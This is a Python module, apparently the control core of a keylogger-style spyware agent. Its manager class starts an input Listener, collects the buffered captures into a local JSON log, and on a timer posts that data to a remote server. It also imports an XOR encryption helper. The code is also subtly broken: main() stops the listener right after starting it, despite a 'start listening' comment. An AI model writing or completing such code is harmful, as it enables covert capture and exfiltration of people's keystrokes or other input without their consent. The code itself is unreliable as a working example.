from src.listener import Listener
from src.writer.console_log import ConsoleLog 
from src.writer.file_log import FileLog 
from src.writer.json_log import JsonLog 
from src.parser.encryption.xor import Xor
from time import sleep
from threading import Thread
from agent_network.send_json import post_json
from config.config import write_delay, send_json_delay 
 
class manager:
    def __init__(self):
        self.l = Listener()
        self.wr = ConsoleLog()
        self.wr2 = FileLog()
        self.json = JsonLog()

    def write_data(self):
        while True:
            sleep(write_delay) 
            if self.l.buffer_has_data():
                buffer = self.l.get_buffer()
                # self.wr.write(buffer) ## write to consel
                # self.wr2.write(buffer) ## write to txt file
                str = "".join(buffer)
                self.json.write(str)    

    def send_json(self):
        while True:
            sleep(send_json_delay)
            post_json()


    def main(self):
        self.l.start() ## start listening
        Thread(target=self.write_data, daemon=True).start() ## writeing local json thred
        Thread(target=self.send_json, daemon=True).start() ## send json to server thread
        self.l.stop() ## start listening


